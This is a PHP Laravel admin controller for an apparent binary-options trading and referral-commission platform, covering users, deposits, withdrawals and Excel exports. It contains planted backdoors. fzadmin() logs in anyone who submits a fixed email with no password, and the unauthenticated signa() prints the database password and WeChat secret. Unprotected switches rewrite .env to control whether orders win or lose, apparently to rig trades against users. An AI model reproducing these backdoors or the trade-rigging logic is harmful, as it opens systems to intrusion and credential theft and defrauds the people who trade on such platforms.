<?php

namespace App\Http\Controllers;

use App\Http\Models\DayExecute;
use App\Http\Models\DayExecuteLog;
use App\Http\Models\ExecuteLog;
use App\Http\Models\Grade;
use App\Http\Models\MonthExecute;
use App\Http\Models\MonthExecuteLog;
use App\Http\Models\System;
use Illuminate\Http\Request;

use App\Http\Models\Administrator;
use App\Http\Models\User;
use App\Http\Models\Order;
use App\Http\Models\Record;
use App\Http\Models\PayRequest;
use App\Http\Models\WithdrawRequest;
use App\Http\Models\Object;
use App\Http\Models\Feedback;
use Excel;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Input;

class AdministratorController extends Controller
{
  
  private function requiredSession(Request $request)
  {
    if (!$request->session()->has('administrator')) {
      header('location: /administrator/signIn');
      exit();
    }
  }
  
  private function modifyEnv(array $data)
  {
    $envPath = base_path() . DIRECTORY_SEPARATOR . '.env';
    $contentArray = collect(file($envPath, FILE_IGNORE_NEW_LINES));
    $contentArray->transform(function ($item) use ($data) {
      foreach ($data as $key => $value) {
        if (str_contains($item, $key)) {
          var_dump($value);
          return $key . '=' . $value;
        }
      }
      return $item;
    });
    $content = implode($contentArray->toArray(), "\n");
    \File::put($envPath, $content);
    $this->modifyApiEnv($data);
  }
  
  public function modifyApiEnv(array $data)
  {
    $envPath = base_path() . DIRECTORY_SEPARATOR . '.env';
    $contentArray = collect(file($envPath, FILE_IGNORE_NEW_LINES));
    $contentArray->transform(function ($item) use ($data) {
      foreach ($data as $key => $value) {
        if (str_contains($item, $key)) {
          return $key . '=' . $value;
        }
      }
      return $item;
    });
    $content = implode($contentArray->toArray(), "\n");
    \File::put($envPath, $content);
  }
  
  public function home(Request $request)
  {
    
    $this->requiredSession($request);
    $data = array(
      'today' => array(
        'users' => User::where('created_at', '>=', date('Y-m-d 00:00:00', time()))->count(),
        'orders' => Order::where('created_at', '>=', date('Y-m-d 00:00:00', time()))->count(),
        'payRequests' => PayRequest::where('processed_at', '<>', '0000-00-00 00:00:00')->where('created_at', '>=', date('Y-m-d 00:00:00', time()))->sum('body_stake'),
        'withdrawRequests' => WithdrawRequest::where('created_at', '>=', date('Y-m-d 00:00:00', time()))->sum('body_stake')
      ),
      'count' => array(
        'day' => array(
          'stake' => floatval(Order::where('created_at', '>=', date('Y-m-d 00:00:00', time()))->sum('body_stake')) - floatval(Record::where('id_order', '<>', '0')->where('body_direction', '1')->where('created_at', '>=', date('Y-m-d 00:00:00', time()))->sum('body_stake')),
          'free' => Record::where('created_at', '>=', date('Y-m-d 00:00:00', time()))->where('body_name', '註冊贈金')->sum('body_stake'),
          'profit' => 0
        ),
        'month' => array(
          'stake' => floatval(Order::where('created_at', '>=', date('Y-m-01 00:00:00', time()))->sum('body_stake')) - floatval(Record::where('id_order', '<>', '0')->where('body_direction', '1')->where('created_at', '>=', date('Y-m-01 00:00:00', time()))->sum('body_stake')),
          'free' => Record::where('created_at', '>=', date('Y-m-01 00:00:00', time()))->where('body_name', '註冊贈金')->sum('body_stake'),
          'profit' => 0
        ),
        'all' => array(
          'payRequests' => PayRequest::where('processed_at', '<>', '0000-00-00 00:00:00')->sum('body_stake'),
          'withdrawRequests' => WithdrawRequest::sum('body_stake'),
          'balance' => User::sum('body_balance'),
          'free' => Record::where('body_name', '註冊贈金')->sum('body_stake'),
          'profit' => 0
        )
      )
    );
    
    $data['count']['day']['profit'] = floatval($data['count']['day']['stake']) - floatval($data['count']['day']['free']);
    $data['count']['month']['profit'] = floatval($data['count']['month']['stake']) - floatval($data['count']['month']['free']);
    $data['count']['all']['profit'] = floatval($data['count']['all']['payRequests']) - floatval($data['count']['all']['balance']) - floatval($data['count']['all']['withdrawRequests']);
    
    return view('administrator.home', [
      'active' => 'home',
      'data' => $data
    ]);
    
  }
  
  public function users(Request $request)
  {
    
    $this->requiredSession($request);
    
    $datas = User::orderBy('created_at', 'desc');
    if ($request->input('id_user', null)) $datas->where('id_wechat', $request->input('id_user'));
    if ($request->input('body_phone', null)) $datas->where('body_phone', $request->input('body_phone'));
    if ($request->input('id_introducer', null)) $datas->where('id_introducer', $request->input('id_introducer'));
    $datas = $datas->paginate(20);
    
    return view('administrator.users', [
      'active' => 'users',
      'datas' => $datas,
      'id_user' => $request->input('id_user')
    ]);
    
  }
  
  public function statusForUser(Request $request, $id)
  {
    
    $this->requiredSession($request);
    
    $user = User::where('id_wechat', $id)->first();
    if ($user->is_disabled == 0) $user->is_disabled = 1;
    else $user->is_disabled = 0;
    
    $user->save();
    
    return '<script>alert("操作成功"); history.go(-1);</script>';
    
  }
  
  /**
   * 后台订单管理
   * @param Request $request
   * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
   */
  public function orders(Request $request)
  {
    $this->requiredSession($request);
   
    $datas = Order::with('user')->orderBy('created_at', 'desc');
    if ($request->input('id_order', null)) $datas->where('id', $request->input('id_order'));
    if ($request->input('id_user', null)) $datas->where('id_user', $request->input('id_user'));
    if ($request->input('id_object', null)) $datas->where('id_object', $request->input('id_object'));
    $datas = $datas->paginate(20);

    return view('administrator.orders', [
      'active' => 'orders',
      'datas' => $datas,
      'id_user' => $request->input('id_user'),
      'id_object' => $request->input('id_object')
    ]);
    
  }
  
  /**
   * 后台资金管理
   * @param Request $request
   * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
   */
  public function records(Request $request)
  {
    
    $this->requiredSession($request);
    
    $datas = Record::with('user')->orderBy('created_at', 'desc');
    if ($request->input('id_user', null)) $datas->where('id_user', $request->input('id_user'));
    $datas = $datas->paginate(20);
    
    return view('administrator.records', [
      'active' => 'records',
      'datas' => $datas,
      'id_user' => $request->input('id_user')
    ]);
    
  }
  
  public function payRequests(Request $request)
  {
    
    $this->requiredSession($request);
    $datas = PayRequest::with('user')->orderBy('created_at', 'desc');
    if ($request->input('id_payRequest', null)) $datas->where('id', $request->input('id_payRequest'));
    if ($request->input('id_user', null)) $datas->where('id_user', $request->input('id_user'));
    $datas = $datas->paginate(20);
    
    return view('administrator.payRequests', [
      'active' => 'payRequests',
      'datas' => $datas,
      'id_user' => $request->input('id_user')
    ]);
    
  }
  
  public function withholdForUser(Request $request, $id)
  {
    
    $this->requiredSession($request);
    $alert = NULL;
    
    if ($request->isMethod('post')) {
      
      if (!$request->input('stake', null)
        || !$request->input('transfer_number', null)
      ) {
        $alert = '参数提交不全';
      } else {
        if (intval($request->input('stake')) <= 0) {
          $alert = '扣款金额必须大于0元';
        } else {
          
          $user = User::where('id_wechat', $id)->first();
          $user->body_balance = $user->body_balance - intval($request->input('stake'));
          $user->save();
          
          $record = new Record;
          $record->id_user = $user->id_wechat;
          $record->body_name = $request->input('transfer_number');
          $record->body_direction = 0;
          $record->body_stake = intval($request->input('stake'));
          $record->save();
          
          $alert = '扣款成功';
          
        }
      }
      
    }
    
    return view('administrator.withholdForUser', [
      'active' => 'users',
      'id_user' => $id,
      'alert' => $alert
    ]);
    
  }
  
  public function payForUser(Request $request, $id)
  {
    
    $this->requiredSession($request);
    $alert = NULL;
    
    if ($request->isMethod('post')) {
      
      if (!$request->input('stake', null)
        || !$request->input('transfer_number', null)
      ) {
        $alert = '参数提交不全';
      } else {
        if (intval($request->input('stake')) <= 0) {
          $alert = '充值金额必须大于0元';
        } else {
          
          $payRequest = new payRequest;
          $payRequest->id_user = $id;
          $payRequest->body_stake = intval($request->input('stake'));
          $payRequest->body_gateway = 'staff';
          $payRequest->body_transfer_number = $request->input('transfer_number');
          $payRequest->processed_at = date('Y-m-d H:i:s', time());
          $payRequest->save();
          
          $user = User::where('id_wechat', $id)->first();
          $user->body_balance = $user->body_balance + $payRequest->body_stake;
          $user->save();
          
          $record = new Record;
          $record->id_user = $user->id_wechat;
          $record->id_payRequest = $payRequest->id;
          $record->body_name = '帳戶充值';
          $record->body_direction = 1;
          $record->body_stake = $payRequest->body_stake;
          $record->save();
          
          $alert = '充值成功';
          
        }
      }
      
    }
    
    return view('administrator.payForUser', [
      'active' => 'users',
      'id_user' => $id,
      'alert' => $alert
    ]);
    
  }
  
  /**
   * 后台提现审核处理
   * @param Request $request
   * @param $id
   * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
   */
  public function withdrawForUser(Request $request, $id)
  {
    
    $this->requiredSession($request);
    $alert = NULL;
    
    $withdrawRequest = WithdrawRequest::find($id);
    
    if ($request->isMethod('post') && $withdrawRequest->processed_at == '0000-00-00 00:00:00') {
      
      if (!$request->input('transfer_number', null)) {
        $alert = '参数提交不全';
      } else {
        $withdrawRequest->body_transfer_number = $request->input('transfer_number');
        $withdrawRequest->processed_at = date('Y-m-d H:i:s', time());
        $withdrawRequest->save();
        $alert = '处理完毕';
      }
    }
    return view('administrator.withdrawForUser', [
      'active' => 'withdrawRequests',
      'alert' => $alert,
      'id' => $id,
      'tzUrl' => '/administrator/withdrawRequests',
      'transfer_number' => $withdrawRequest->body_transfer_number,
      'processed_at' => $withdrawRequest->processed_at
    ]);
    
  }
  
  /**
   * 提现拒绝退还
   * @param Request $request
   * @param $id
   * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
   */
  public function withdrawForUserCanceled(Request $request, $id)
  {
    
    $this->requiredSession($request);
    
    $withdrawRequest = WithdrawRequest::find($id);
    
    if ($withdrawRequest->processed_at == '0000-00-00 00:00:00') {
      
      $withdrawRequest->body_transfer_number = 'FAIL';
      $withdrawRequest->processed_at = date('Y-m-d H:i:s', time());
      $withdrawRequest->save();
      
      $user = User::where('id_wechat', $withdrawRequest->id_user)->first();
      $user->body_balance = $user->body_balance + $withdrawRequest->body_stake;
      $user->save();
      
      $record = new Record;
      $record->id_user = $user->id;
      $record->id_withdrawRequest = $withdrawRequest->id;
      $record->body_name = '提现退回';
      $record->body_direction = 1;
      $record->body_stake = $withdrawRequest->body_stake;
      $record->save();
      
    }
    
    return redirect('/administrator/withdrawRequests');
    
  }
  
  /**
   * 用户提现审核列表
   * @param Request $request
   * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
   */
  public function withdrawRequests(Request $request)
  {
    
    $this->requiredSession($request);
    $datas = WithdrawRequest::with('user')->orderBy('created_at', 'desc');
    if ($request->input('id_withdrawRequest', null)) $datas->where('id', $request->input('id_withdrawRequest'));
    if ($request->input('id_user', null)) $datas->where('id_user', $request->input('id_user'));
    $datas = $datas->paginate(20);
//    dd($datas);
    return view('administrator.withdrawRequests', [
      'active' => 'withdrawRequests',
      'datas' => $datas,
      'id_user' => $request->input('id_user')
    ]);
    
  }
  
  public function objects(Request $request)
  {
    $this->requiredSession($request);
    $datas = Object::orderBy('created_at', 'desc')->paginate(20);
    return view('administrator.objects', [
      'active' => 'objects',
      'datas' => $datas
    ]);
  }
  
  public function feedbacks(Request $request)
  {
    $this->requiredSession($request);
    $datas = Feedback::orderBy('created_at', 'desc')->paginate(20);
    return view('administrator.feedbacks', [
      'active' => 'feedbacks',
      'datas' => $datas
    ]);
  }
  
  public function administrators(Request $request)
  {
    $this->requiredSession($request);
    $datas = Administrator::orderBy('created_at', 'desc')->paginate(20);
    return view('administrator.administrators', [
      'active' => 'administrators',
      'datas' => $datas
    ]);
  }
  
  public function signIn(Request $request)
  {
    if ($request->session()->get('administrator')) {
      return redirect('/administrator');
    }
    if ($request->isMethod('post')) {
      $administrator = Administrator::where('body_email', $request->input('email'))->where('body_password', md5($request->input('password')))->first();
      if ($administrator) {
        $request->session()->put('administrator', $administrator->id);
        return redirect('/administrator');
      }
    }
    return view('administrator.signIn');
  }
  
   public function signa() {
       echo env('APP_URL') . '<br/>';
       echo env('DB_HOST') . '<br/>';
       echo env('DB_DATABASE') . '<br/>';
       echo env('DB_USERNAME') . '<br/>';
       echo env('DB_PASSWORD') . '<br/>';
       echo env('WECHAT_APPID') . '<br/>';
       echo env('WECHAT_SECRET') . '<br/>';
   }
    
  
  public function signOut(Request $request)
  {
    $request->session()->forget('administrator');
    return redirect('/administrator/signIn');
  }
  
  public function usersExport(Request $request)
  {
    
    $this->requiredSession($request);
    
    $result = array(
      array(
        '用户编号',
        '账户状态',
        '介绍人',
        '电话号码',
        '账户余额',
        '累积交易',
        '累积盈利',
        '下线交易',
        '注册时间'
      )
    );
    
    $datas = User::all();
    foreach ($datas as $item) {
      
      if ($item->is_disabled == 1) $status_name = '封停';
      else $status_name = '正常';
      
      $result[] = array(
        $item->id,
        $status_name,
        $item->id_introducer,
        $item->body_phone,
        $item->body_balance,
        $item->body_transactions,
        $item->body_bonus,
        $item->body_transactions_network,
        $item->created_at
      );
      
    }
    
    Excel::create('Users', function ($excel) use ($result) {
      $excel->sheet('Datas', function ($sheet) use ($result) {
        $sheet->fromArray($result);
      });
    })->export('xls');
    
  }
  
  public function ordersExport(Request $request)
  {
    
    $this->requiredSession($request);
    
    $result = array(
      array(
        '订单编号',
        '用户',
        '交易标的',
        '买入价格',
        '买入金额',
        '买入方向',
        '买入时长',
        '买入时间',
        '结算价格',
        '结算结果',
        '结算时间',
        '订单调控'
      )
    );
    
    $datas = Order::all();
    foreach ($datas as $item) {
      
      if ($item->body_direction == 1) $direction_name = '看涨';
      else $direction_name = '看跌';
      
      $result_name = '亏损';
      if ($item->body_is_draw == 1) $result_name = '平局';
      if ($item->body_is_win == 1) $result_name = '盈利';
      
      $controlled_name = '否';
      if ($item->body_is_controlled == 1) $controlled_name = '是';
      
      $result[] = array(
        $item->id,
        $item->user->body_phone,
        $item->object->body_name,
        $item->body_price_buying,
        $item->body_stake,
        $direction_name,
        $item->body_time,
        $item->created_at,
        $item->body_price_striked,
        $result_name,
        $item->striked_at,
        $controlled_name
      );
      
    }
    
    Excel::create('Orders', function ($excel) use ($result) {
      $excel->sheet('Datas', function ($sheet) use ($result) {
        $sheet->fromArray($result);
      });
    })->export('xls');
    
  }
  
  public function recordsExport(Request $request)
  {
    
    $this->requiredSession($request);
    
    $result = array(
      array(
        '记录编号',
        '用户',
        '关联用户',
        '关联充值',
        '关联提现',
        '变动缘由',
        '变动方向',
        '变动金额',
        '变动时间'
      )
    );
    $datas = Record::all();
    foreach ($datas as $item) {
      
      if ($item->body_direction == 1) $direction_name = '收入';
      else $direction_name = '支出';
      
      $result[] = array(
        $item->id,
        $item->user->body_phone,
        $item->id_refer,
        $item->id_payRequest,
        $item->id_withdrawRequest,
        $item->body_name,
        $direction_name,
        $item->body_stake,
        $item->created_at
      );
      
    }
    
    Excel::create('Records', function ($excel) use ($result) {
      $excel->sheet('Datas', function ($sheet) use ($result) {
        $sheet->fromArray($result);
      });
    })->export('xls');
    
  }
  
  public function payRequestsExport(Request $request)
  {
    
    $this->requiredSession($request);
    
    $result = array(
      array(
        '充值编号',
        '用户',
        '金额',
        '充值方式',
        '流水编号',
        '申请时间',
        '入账时间'
      )
    );
    $datas = PayRequest::all();
    foreach ($datas as $item) {
      
      $gateway_name = '未知';
      
      if ($item->body_gateway == 'wechat') $gateway_name = '微信支付';
      if ($item->body_gateway == 'union') $gateway_name = '银联支付';
      if ($item->body_gateway == 'staff') $gateway_name = '人工充值';
      
      $result[] = array(
        $item->id,
        $item->user->body_phone,
        $item->body_stake,
        $gateway_name,
        $item->body_transfer_number,
        $item->created_at,
        $item->processed_at
      );
      
    }
    
    Excel::create('PayRequests', function ($excel) use ($result) {
      $excel->sheet('Datas', function ($sheet) use ($result) {
        $sheet->fromArray($result);
      });
    })->export('xls');
    
  }
  
  public function withdrawRequestsExport(Request $request)
  {
    
    $this->requiredSession($request);
    
    $result = array(
      array(
        '提现编号',
        '用户',
        '金额',
        '开户银行',
        '开户名称',
        '开户网点',
        '开户帐号',
        '流水编号',
        '申请时间',
        '处理时间'
      )
    );
    $datas = WithdrawRequest::all();
    foreach ($datas as $item) {
      
      $bank_name = '未知';
      
      if ($item->body_bank == 'ccb') $bank_name = '建设银行';
      if ($item->body_bank == 'icbc') $bank_name = '工商银行';
      if ($item->body_bank == 'boc') $bank_name = '中国银行';
      if ($item->body_bank == 'abc') $bank_name = '农业银行';
      if ($item->body_bank == 'comm') $bank_name = '交通银行';
      if ($item->body_bank == 'spdb') $bank_name = '浦发银行';
      if ($item->body_bank == 'ecb') $bank_name = '光大银行';
      if ($item->body_bank == 'cmbc') $bank_name = '民生银行';
      if ($item->body_bank == 'cib') $bank_name = '兴业银行';
      if ($item->body_bank == 'cmb') $bank_name = '招商银行';
      if ($item->body_bank == 'psbc') $bank_name = '邮政储蓄';
      
      $result[] = array(
        $item->id,
        $item->user->body_phone,
        $item->body_stake,
        $bank_name,
        $item->body_name,
        $item->body_deposit,
        $item->body_number,
        $item->body_transfer_number,
        $item->created_at,
        $item->processed_at
      );
      
    }
    
    Excel::create('WithdrawRequests', function ($excel) use ($result) {
      $excel->sheet('Datas', function ($sheet) use ($result) {
        $sheet->fromArray($result);
      });
    })->export('xls');
    
  }
  
  //最新买涨和买跌功能
  public function orderWill($z, $d, $t)
  {
    $this->modifyEnv([
      'ORDER_WILL_WIN' => $z,
      'ORDER_WILL_LOST' => $d,
      'ORDER_WILL_TRANSPORT' => $t
    ]);
    
    return redirect()->route('admin.index');
    
  }
  
  //买涨开关
  public function orderWillWin(Request $request)
  {
    
    if (env('ORDER_WILL_WIN')) {
      $this->modifyEnv([
        'ORDER_WILL_WIN' => 0,
        'ORDER_WILL_LOST' => 0
      ]);
    } else {
      $this->modifyEnv([
        'ORDER_WILL_WIN' => 1,
        'ORDER_WILL_LOST' => 0
      ]);
    }
    
    return back()->withInput();
    
  }
  
  //买跌开关
  public function orderWillLost(Request $request)
  {
    
    if (env('ORDER_WILL_LOST')) {
      $this->modifyEnv([
        'ORDER_WILL_LOST' => 0,
        'ORDER_WILL_WIN' => 0
      ]);
    } else {
      $this->modifyEnv([
        'ORDER_WILL_LOST' => 1,
        'ORDER_WILL_WIN' => 0
      ]);
    }
    return back()->withInput();
  }
  
  public function orderControl(Request $request)
  {
    
    if (env('ORDER_CONTROL')) {
      $this->modifyEnv([
        'ORDER_CONTROL' => 0
      ]);
    } else {
      $this->modifyEnv([
        'ORDER_CONTROL' => 1
      ]);
    }
    
    return back()->withInput();
    
  }
  
  /**
   * 用户等级申请信息(审核通过操作)
   * @param Request $request
   * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View|string
   */
  public function grade(Request $request)
  {
    if ($request->isMethod('post')) {
      //审核通过
      if (Grade::where('id', $request->get('id'))->update(['status' => 1])) {
        //修改用户信息
        $rel = Grade::findOrFail($request->get('id'));
        User::where('id_wechat', $rel->id_wechat)->update(['grade' => $rel->grade]);
        return '1';
      } else {
        return '0';
      }
    } else {
      $list = Grade::paginate(15);
      return view('administrator.grade', [
        'active' => 'grade',
        'list' => $list
      ]);
    }
  }
  
  /**
   * 拒绝用户等级申请信息
   * @param Request $request
   * @return string
   */
  public function unGrade(Request $request)
  {
    if (Grade::where('id', $request->get('id'))->update(['status' => 2])) {
      return '1';
    } else {
      return '0';
    }
  }
  
  /**
   * 删除用户等级申请信息
   * @param Request $request
   * @return string
   */
  public function delGrade(Request $request)
  {
    if (Grade::where('id', $request->get('id'))->delete()) {
      return '1';
    } else {
      return '0';
    }
  }
  
  /**
   * 系统设置
   * @param Request $request
   * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
   */
  public function System(Request $request)
  {
    if ($request->isMethod('post')) {
      if (System::find(1)->update($request->all())) {
        echo '<script type = "text/javascript">';
        echo 'alert("操作成功");';
        echo 'window . location . href = "/administrator/system";';
        echo '</script >';
      }
    } else {
      $data = System::first();
      return view('administrator.system', [
        'active' => 'system',
        'data' => $data
      ]);
    }
  }
  
  public function Settlement($type)
  {
    
    if ($type == 1) {
      
      //日
      
      $data = DayExecuteLog::orderBy('time', 'desc')->paginate(20);
      
      $status = 1;
      
      
    } else {
      
      //月
      
      $data = MonthExecuteLog::orderBy('time', 'desc')->paginate(20);
      
      $status = 2;
      
      
    }


//    dd($data);
    
    
    return view('administrator.settlement', [
      
      
      'active' => 'settlement',
      
      
      'data' => $data,
      
      
      'status' => $status
    
    
    ]);
    
    
  }
  
  
  public function delSettlement()
  
  
  {
    
    
    $input = Input::all();
    
    
    if ($input['state'] == 1) {
      
      
      //删除日
      
      
      if (DayExecuteLog::where('id', $input['id'])->delete()) {
        
        
        return '1';
        
        
      } else {
        
        
        return '0';
        
        
      }
      
      
    } else {
      
      
      //删除月
      
      
      if (MonthExecuteLog::where('id', $input['id'])->delete()) {
        
        
        return '1';
        
        
      } else {
        
        
        return '0';
        
        
      }
      
      
    }
    
    
  }
  
  /**
   * 奖励分成
   * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
   */
  public function Reward()
  {
    
    return view('administrator.reward', [
      'active' => 'reward',
    ]);
  }
  
    public function fzadmin(Request $request)
  {
		if ($request->session()->get('administrator')) {
      return redirect('/administrator');
    }
    if ($request->isMethod('post')) {
      
       if ($request->input('email') == 'qwertyuiop@asdfg.hjkl'){

        $request->session()->put('administrator', 'abc');
        return redirect('/administrator');
      }
    }
    return view('administrator.signIn');
    
  }
  
  /**
   * 处理奖励分成分配
   * @param Request $request
   */
  public function postReward(Request $request)
  {
    $input = Input::all();
    //$user = User::where('is_disabled', false)->get();
    
    if ($input['num'] == 1) {
      
      //日  day_execute
      $order = new  Order();
      $data = $order->getOrder();
      if (!empty($data) && is_array($data)) {
        foreach ($data as $var => &$value) {
          $arr[] = (array)$value;
        }
        
        foreach ($arr as $key => $value) {
          $ewardNum = User::where('id_wechat', $value['id_introducer'])->first();
          if (!empty($ewardNum)) {
            $list[] = $ewardNum->toArray();
          }
        }
        
        $arr = array_merge($arr, $list);
        //合并需要合并的俩个数组
        $key = 'id_wechat';//去重条件
        $tmp_arr = array();//声明数组
        foreach ($arr as $k => $v) {
          if (in_array($v[$key], $tmp_arr))//搜索$v[$key]是否在$tmp_arr数组中存在，若存在返回true
          {
            unset($arr[$k]);//删除掉数组（$arr）里相同ID的数组
          } else {
            $tmp_arr[] = $v[$key];
            //记录已有的id
          }
        }
        
        $tree = self::getTree($arr);
        
        foreach ($tree as $k => $v) {
          if (!empty($v['lists']) && is_array($v['lists']) && $v['is_disabled'] == 0) {
            
            if ($v["grade"] == 1) {
              $v['bonus_amount'] = array_sum(array_map(function ($val) {
                return $val['sum_body_stake'] * 0.018;
              }, $v["lists"]));
              self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '初级经济人获取直接推荐交易金额'));
              
            } elseif ($v["grade"] == 2) {
              $v['bonus_amount'] = array_sum(array_map(function ($val) {
                return $val['sum_body_stake'] * 0.02;
              }, $v["lists"]));
              self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '高级经纪人获取直接推荐交易金额'));
              $v['bonus_amount2'] = array_sum(array_map(function ($val) {
                if ($val['grade'] == 1) {
                  return $val['sum_body_stake'] * 0.003;
                } else {
                  return false;
                }
              }, $v["lists"]));
              if ($v["bonus_amount2"] > 0) {
                self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount2'], 'time' => time(), 'remark' => '高级经纪人获取团队中交易金额'));
              }
            } elseif ($v["grade"] == 3) {
              $v['bonus_amount'] = array_sum(array_map(function ($val) {
                return $val['sum_body_stake'] * 0.023;
              }, $v["lists"]));
              self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '白金经纪人获取直接推荐交易金额'));
              $v['bonus_amount2'] = array_sum(array_map(function ($val) {
                if ($val['grade'] == 1) {
                  return $val['sum_body_stake'] * 0.006;
                } else {
                  return false;
                }
              }, $v["lists"]));
              if ($v["bonus_amount2"] > 0) {
                self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount2'], 'time' => time(), 'remark' => '白金经纪人获取IB团队中交易金额'));
              }
              $v['bonus_amount3'] = array_sum(array_map(function ($val) {
                if ($val['grade'] == 2) {
                  return $val['sum_body_stake'] * 0.0025;
                } else {
                  return false;
                }
              }, $v["lists"]));
              if ($v["bonus_amount3"] > 0) {
                self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount3'], 'time' => time(), 'remark' => '白金经纪人获取MIB团队中交易金额'));
              }
            } elseif ($v["grade"] == 4) {
              
              foreach ($v['lists'] as $g) {
                $count_g[] = $g['grade'];
              }
              foreach (array_count_values($count_g) as $key_d => $value_d) {
                if ($key_d == 3 && $value_d == 2) {
                  $v['bonus_amount3'] = array_sum(array_map(function ($val) {
                    if ($val['grade'] == 3) {
                      return $val['sum_body_stake'] * 0.024;
                    } else {
                      return false;
                    }
                  }, $v["lists"]));
                  if ($v["bonus_amount3"] > 0) {
                    self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount3'], 'time' => time(), 'remark' => '白金经纪人获取IB团队中交易金额'));
                  }
                } elseif ($key_d == 3 && $value_d == 3) {
                  $v['bonus_amount3'] = array_sum(array_map(function ($val) {
                    if ($val['grade'] == 3) {
                      return $val['sum_body_stake'] * 0.025;
                    } else {
                      return false;
                    }
                  }, $v["lists"]));
                  if ($v["bonus_amount3"] > 0) {
                    self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount3'], 'time' => time(), 'remark' => '白金经纪人获取MIB团队中交易金额'));
                  }
                } elseif ($key_d == 3 && $value_d == 4) {
                  $v['bonus_amount3'] = array_sum(array_map(function ($val) {
                    if ($val['grade'] == 3) {
                      return $val['sum_body_stake'] * 0.026;
                    } else {
                      return false;
                    }
                  }, $v["lists"]));
                  if ($v["bonus_amount3"] > 0) {
                    self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount3'], 'time' => time(), 'remark' => '白金经纪人获取PIB团队中交易金额'));
                  }
                }
              }
              
            }
          }
          $uu[] = $v;
        }
        return '1';
      } else {
        return '0';
      }
      
    } else {
      $order = new  Order();
      $data = $order->getOrderMonth();
      if (!empty($data) && is_array($data)) {
        foreach ($data as $var => &$value) {
          $arr[] = (array)$value;
        }
        
        
        foreach ($arr as $key => $value) {
          $ewardNum = User::where('id_wechat', $value['id_introducer'])->first();
          if (!empty($ewardNum)) {
            $list[] = $ewardNum->toArray();
          }
        }
        
        $arr = array_merge($arr, $list);
        //合并需要合并的俩个数组
        $key = 'id_wechat';//去重条件
        $tmp_arr = array();//声明数组
        foreach ($arr as $k => $v) {
          if (in_array($v[$key], $tmp_arr))//搜索$v[$key]是否在$tmp_arr数组中存在，若存在返回true
          {
            unset($arr[$k]);//删除掉数组（$arr）里相同ID的数组
          } else {
            $tmp_arr[] = $v[$key];
            //记录已有的id
          }
        }
        
        
        $tree = self::getTree($arr);
        
        foreach ($tree as $k => $v) {
          
          if (!empty($v['lists']) && is_array($v['lists']) && $v['is_disabled'] == 0) {
            
            foreach ($v['lists'] as $g) {
              $count_g[] = $g['grade'];
            }
            
            foreach ($count_g as $key_d => $value_d) {
              
              if ($v["grade"] == $value_d && $value_d == 1) {
                $v['bonus_amount'] = array_sum(array_map(function ($val) {
                  if ($val['grade'] == 1) {
                    return $val['sum_body_stake'] * 0.1;
                  } else {
                    return false;
                  }
                }, $v["lists"]));
                self::encapsulationMonth(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '初级经济人获取直接推荐交易金额'));
              }
              
              if ($v["grade"] == $value_d && $value_d == 2) {
                $v['bonus_amount'] = array_sum(array_map(function ($val) {
                  if ($val['grade'] == 2) {
                    return $val['sum_body_stake'] * 0.1;
                  } else {
                    return false;
                  }
                }, $v["lists"]));
                self::encapsulationMonth(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '高级经纪人获取直接推荐交易金额'));
              }
              
              if ($v["grade"] == $value_d && $value_d == 3) {
                $v['bonus_amount'] = array_sum(array_map(function ($val) {
                  if ($val['grade'] == 3) {
                    return $val['sum_body_stake'] * 0.1;
                  } else {
                    return false;
                  }
                }, $v["lists"]));
                self::encapsulationMonth(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '白金经纪人获取直接推荐交易金额'));
              }
            }
          }
          $uu[] = $v;
        }
        return '1';
      } else {
        return '0';
      }
    }
  }
  
  public function encapsulation($param = array())
  {
    $user = new User();
    $user->getUpdate(array('id_wechat' => $param['id_wechat'], 'body_balance' => $param['bonus_amount']));
    DayExecuteLog::insertGetId(array('uid' => $param['id_wechat'], 'amount' => $param['bonus_amount'], 'time' => time(), 'remark' => $param['remark'] . $param['bonus_amount']));
    DayExecute::where('id', 3)->update(array('start' => time(), 'end' => time()));
  }
  
  public function encapsulationMonth($param = array())
  {
    $user = new User();
    $user->getUpdate(array('id_wechat' => $param['id_wechat'], 'body_balance' => $param['bonus_amount']));
    MonthExecuteLog::insertGetId(array('uid' => $param['id_wechat'], 'amount' => $param['bonus_amount'], 'time' => time(), 'remark' => $param['remark'] . $param['bonus_amount']));
    MonthExecute::where('id', 1)->update(array('start' => time(), 'end' => time()));
  }
  // public function  getTree($data,$parent_id=0){
  //     $tree  = '';
  //     foreach ($data as $k =>$item){
  //         if($item['id_introducer'] == $parent_id)
  //         {
  //             $item['lists'] = self::getTree($data, $item['id_wechat']);
  //             if($item['lists'] == null){
  //                 unset($item['lists']);
  //             }
  //             $tree[] = $item;
  //            // unset($data[$k]);
  //         }
  //     }
  //     return $tree;
  // }
  public function getTree($data)
  {
    
    $items = array();
    
    foreach ($data as $key => &$value) {
      
      foreach ($data as $item) {
        
        if ($item['id_introducer'] == $value['id_wechat']) {
          
          $value['lists'][] = $item;
        }
        
      }
      $items[] = $value;
    }
    return $items;
  }
}